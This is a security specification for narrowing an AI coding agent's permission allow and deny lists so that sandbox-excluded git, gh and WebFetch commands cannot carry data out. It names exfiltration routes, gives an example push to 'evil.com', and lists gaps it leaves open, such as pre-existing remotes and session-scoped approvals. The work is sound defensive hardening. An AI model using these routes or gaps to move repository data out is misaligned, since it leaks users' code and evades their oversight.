# Specification: Close exfiltration channels in sandbox-excluded commands

## Problem Statement

The global `claude/settings.json` template has `git:*`, `gh:*`, and `WebFetch` listed in both the allow list and `excludedCommands`. Since `excludedCommands` bypasses sandbox enforcement, these commands have only one security layer — the permission allow/deny list. The current allow list is overly broad (`Bash(gh *)`, `Bash(git remote *)`, `WebFetch`), leaving confirmed exfiltration channels open for all interactive sessions across every project on the machine. This ticket narrows the allow list and adds targeted deny rules to close these channels.

## Requirements

1. **Remove WebFetch from global allow list**: `"WebFetch"` is removed from `permissions.allow` in `claude/settings.json`. WebFetch remains in `sandbox.excludedCommands`. Acceptance criteria: `python3 -c "import json; d=json.load(open('claude/settings.json')); print('WebFetch' not in d['permissions']['allow'])"` = `True`.

2. **Replace `Bash(gh *)` with read-only subcommand patterns**: The catch-all `"Bash(gh *)"` is removed from `permissions.allow` and replaced with these specific read-only patterns:
   - `Bash(gh pr view *)`
   - `Bash(gh pr list *)`
   - `Bash(gh pr diff *)`
   - `Bash(gh pr checks *)`
   - `Bash(gh repo view *)`
   - `Bash(gh run list *)`
   - `Bash(gh run view *)`
   
   Acceptance criteria: `python3 -c "import json; d=json.load(open('claude/settings.json')); print('Bash(gh *)' not in d['permissions']['allow'] and 'Bash(gh pr view *)' in d['permissions']['allow'])"` = `True`.

3. **Deny gh gist commands**: Add to `permissions.deny`:
   - `Bash(gh gist create *)`
   - `Bash(gh gist edit *)`
   
   Both are designed for arbitrary content upload — `create` makes a new gist, `edit` can replace content in an existing one. Acceptance criteria: `python3 -c "import json; d=json.load(open('claude/settings.json')); d_list=d['permissions']['deny']; print('Bash(gh gist create *)' in d_list and 'Bash(gh gist edit *)' in d_list)"` = `True`.

4. **Narrow `git remote` to read-only**: Replace `"Bash(git remote *)"` in `permissions.allow` with:
   - `Bash(git remote -v)`
   - `Bash(git remote get-url *)`
   
   Keep existing `"Bash(git remote)"` (no args) as-is. Acceptance criteria: `python3 -c "import json; d=json.load(open('claude/settings.json')); a=d['permissions']['allow']; print('Bash(git remote *)' not in a and 'Bash(git remote -v)' in a and 'Bash(git remote get-url *)' in a)"` = `True`.

5. **Deny git remote mutation commands**: Add to `permissions.deny`:
   - `Bash(git remote add *)`
   - `Bash(git remote set-url *)`
   - `Bash(git remote remove *)`
   
   Git's `remote` subcommands (`add`, `set-url`, `remove`) must immediately follow `remote` — flags specific to the subcommand come after the subcommand name — so these patterns are sufficient without flag-position variants.
   
   Acceptance criteria: `python3 -c "import json; d=json.load(open('claude/settings.json')); d_list=d['permissions']['deny']; print(all(x in d_list for x in ['Bash(git remote add *)', 'Bash(git remote set-url *)', 'Bash(git remote remove *)']))"` = `True`.

6. **Deny inline URL git pushes**: Add to `permissions.deny`:
   - `Bash(git push https://*)`
   - `Bash(git push http://*)`
   - `Bash(git push * https://*)`
   - `Bash(git push * http://*)`
   
   The first two patterns catch URL-as-first-argument; the second two catch flags-before-URL (e.g., `git push --force https://evil.com`). This follows the existing convention for flag-position variants — the force-push deny already uses three patterns (`Bash(git push --force *)`, `Bash(git push * --force)`, `Bash(git push * --force *)`) for the same reason.
   
   Acceptance criteria: `python3 -c "import json; d=json.load(open('claude/settings.json')); d_list=d['permissions']['deny']; print(all(x in d_list for x in ['Bash(git push https://*)', 'Bash(git push http://*)', 'Bash(git push * https://*)', 'Bash(git push * http://*)']))"` = `True`.

7. **Settings JSON remains valid**: `python3 -c "import json; json.load(open('claude/settings.json'))"` exits 0.

## Non-Requirements

- **No changes to `excludedCommands`**: WebFetch, git, and gh remain in `sandbox.excludedCommands`. Removing them would break legitimate operations that need filesystem/network access outside the sandbox.
- **No changes to overnight runner**: The overnight runner uses `--dangerously-skip-permissions`, bypassing the permission system entirely. This ticket only affects interactive sessions.
- **No escape hatch changes**: Removing `Bash(bash *)`, `Bash(python3 *)`, etc. is ticket 057. Verifying whether they bypass deny rules is ticket 055.
- **No settings.local.json changes**: Power users who need `gh pr create`, `gh api`, or other write operations add them to their project-level or machine-level `settings.local.json`.
- **No hook or script modifications**: `cortex-sync-permissions.py` auto-propagates changes without modification.
- **No deny for `gh api`**: Falls through to prompt (not in allow list). Users can approve intentionally when needed.
- **No mitigation for `gh pr create --body` exfiltration**: Accepted as residual risk — human is present for the initial approval and session-scoped reuse is a platform characteristic (see Technical Constraints).
- **No file-staging exfiltration mitigation**: Commands like `git bundle create`, `git format-patch`, and `git archive` can write repository content to local files. These are not addressed because the second step — exfiltrating the staged file over the network — is gated by sandbox network restrictions (bash commands) and the WebFetch prompt. The two-step attack requires chaining a file-staging command with a network exfiltration command, and the network layer provides defense-in-depth.
- **No deny for other gh write commands (issue create, pr comment, release create, workflow run)**: These fall through to prompt. Unlike `gh gist create/edit` (which are designed for arbitrary content upload with no repository context), these commands leave visible artifacts in specific repos and require target context, making them higher-risk for the attacker and lower-value as exfiltration channels.

## Edge Cases

- **User needs a gh write command (pr create, pr merge, etc.)**: Falls through to prompt — user approves once per session. No workflow breakage, just a one-time prompt.
- **User needs WebFetch directly**: Falls through to prompt. Context7 and Perplexity MCP servers handle most research needs. The /research skill already handles this: "If WebFetch is denied in this environment, fall back to WebSearch-only results."
- **User pushes with SSH URL directly (`git push git@...`)**: Not affected by the HTTP/HTTPS deny rules. SSH pushes use the git protocol, not URLs matching `https://*`. Legitimate SSH pushes to non-standard remotes still work. The SSH case is lower risk because it requires key-based authentication.
- **Legitimate use of `git remote add` (e.g., adding an upstream fork)**: Denied by the new rule. User sees a deny message. They must add `Bash(git remote add *)` to their `settings.local.json`. This is intentional — adding arbitrary remotes is the primary exfiltration vector.
- **`cortex-sync-permissions.py` merge behavior**: The hook performs union merges of allow/deny arrays. New deny rules from the global template propagate automatically to project-local settings. No special handling needed.
- **Existing `settings.local.json` with `Bash(gh *)` override**: If a user's local settings already include `Bash(gh *)`, the union merge preserves it alongside the narrowed global patterns. The broader local allow takes effect. This is expected — local settings are the user's deliberate choice.
- **Pre-existing named remotes**: If a repository already has a second remote (e.g., `upstream`, `fork`) configured before these rules take effect, `git push upstream` matches the existing `Bash(git push *)` allow rule and bypasses the inline URL deny rules (the URL is resolved internally by git). This is accepted as residual risk — the ticket prevents *creating new* exfiltration endpoints, not exploiting pre-existing ones. The remote was legitimately added and removing it would require `git remote remove` (now denied).

## Changes to Existing Behavior

- MODIFIED: `WebFetch` — from auto-allowed to prompt-on-first-use per domain in interactive sessions
- MODIFIED: `Bash(gh *)` — from catch-all auto-allowed to 7 specific read-only subcommand patterns; all other gh commands (pr create, pr merge, api, issue, gist, etc.) fall through to prompt
- MODIFIED: `Bash(git remote *)` — from catch-all auto-allowed to 2 read-only patterns (`-v`, `get-url`); remote mutation commands (`add`, `set-url`, `remove`) explicitly denied
- ADDED: `Bash(gh gist create *)`, `Bash(gh gist edit *)` to deny list — explicitly blocked (not just un-allowed)
- ADDED: `Bash(git remote add *)`, `Bash(git remote set-url *)`, `Bash(git remote remove *)` to deny list
- ADDED: `Bash(git push https://*)`, `Bash(git push http://*)`, `Bash(git push * https://*)`, `Bash(git push * http://*)` to deny list — prevents inline URL exfiltration in both direct and flags-before-URL positions

## Technical Constraints

- `claude/settings.json` must remain valid JSON after edits
- Permission evaluation order is deny → ask → allow (first match wins). Deny rules take precedence over allow rules — important for the `git push` case where `Bash(git push *)` is in allow but `Bash(git push https://*)` is in deny.
- `cortex-sync-permissions.py` merges global + local settings via union of arrays. New entries propagate automatically.
- The `excludedCommands` list is unchanged — these commands still bypass the sandbox. The permission deny/allow list is the sole enforcement layer for them.
- **Glob pattern matching is prefix-based**: Deny patterns like `Bash(git push https://*)` match when the command string starts with `git push https://`. Git allows flags at various positions, so deny rules must cover multiple argument orderings (see Requirement 6's flag-position variants). This follows the existing convention established by the force-push deny patterns.
- **Session-scoped prompt approval**: When a command falls through to prompt and the user approves, that approval persists for the session. This means the first approval gates all subsequent uses of the same command pattern. This is a Claude Code platform behavior, not configurable via settings.json. For commands moved from auto-allow to prompt (WebFetch, gh write commands), the security improvement is from "zero user awareness" to "at least one explicit approval." Prompt injection exploiting session-scoped approvals is a separate concern outside this ticket's scope.

## Open Decisions

None — all decisions resolved during research and interview.
